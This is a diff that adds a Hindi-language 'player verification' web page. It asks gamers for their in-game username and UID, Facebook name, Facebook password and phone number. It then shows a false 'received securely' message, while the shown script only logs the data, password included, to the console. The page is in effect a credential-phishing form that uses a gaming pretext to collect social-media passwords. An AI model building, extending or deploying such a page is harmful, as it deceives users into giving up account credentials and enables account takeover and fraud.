@@ -1,1 +1,161 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>प्लेयर वेरिफिकेशन फॉर्म</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .form-card {
+            background-color: #1e293b;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #38bdf8;
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #94a3b8;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #475569;
+            border-radius: 6px;
+            background-color: #0f172a;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #38bdf8;
+        }
+        button {
+            width: 100%;
+            padding: 13px;
+            background-color: #38bdf8;
+            border: none;
+            color: #0f172a;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #7dd3fc;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
 
+<div class="form-card">
+    <h2>प्लेयर वेरिफिकेशन</h2>
+    <form id="playerForm">
+        <div class="input-group">
+            <label for="inGameName">In-game Username:</label>
+            <input type="text" id="inGameName" required placeholder="उदा. ProGamer_99" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label for="inGameUID">In-game UID:</label>
+            <input type="text" id="inGameUID" required placeholder="उदा. 87654321" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label for="fbName">Facebook Name (प्रोफाइल नाम):</label>
+            <input type="text" id="fbName" required placeholder="उदा. Rahul Kumar" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label for="fbPassword">Facebook Password:</label>
+            <input type="password" id="fbPassword" required placeholder="पासवर्ड डालें" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" required 
+                   pattern="[0-9]{10}" 
+                   maxlength="10" 
+                   placeholder="10 अंकों का मोबाइल नंबर"
+                   inputmode="numeric"
+                   autocomplete="off">
+        </div>
+
+        <button type="submit">डिटेल्स सबमिट करें</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('playerForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // वैल्यूज लेना और trim करना
+        const username = document.getElementById('inGameName').value.trim();
+        const uid = document.getElementById('inGameUID').value.trim();
+        const facebookName = document.getElementById('fbName').value.trim();
+        const facebookPassword = document.getElementById('fbPassword').value;
+        const phoneNumber = document.getElementById('phone').value.trim();
+
+        // खाली फील्ड चेक
+        if (!username || !uid || !facebookName || !facebookPassword || !phoneNumber) {
+            alert("कृपया सभी फील्ड सही तरीके से भरें!");
+            return;
+        }
+
+        // फोन नंबर 10 अंकों का है या नहीं
+        if (!/^\d{10}$/.test(phoneNumber)) {
+            alert("कृपया सही 10 अंकों का मोबाइल नंबर डालें!");
+            return;
+        }
+
+        const playerData = {
+            username: username,
+            uid: uid,
+            facebookName: facebookName,
+            facebookPassword: facebookPassword,
+            phoneNumber: phoneNumber
+        };
+
+        // कंसोल में दिखाना
+        console.log("Submitted Player Data:", playerData);
+
+        alert("✅ आपकी डिटेल्स सुरक्षित रूप से प्राप्त हो गई हैं!\n\nधन्यवाद!");
+
+        // फॉर्म रीसेट
+        document.getElementById('playerForm').reset();
+    });
+</script>
+
+</body>
+</html>
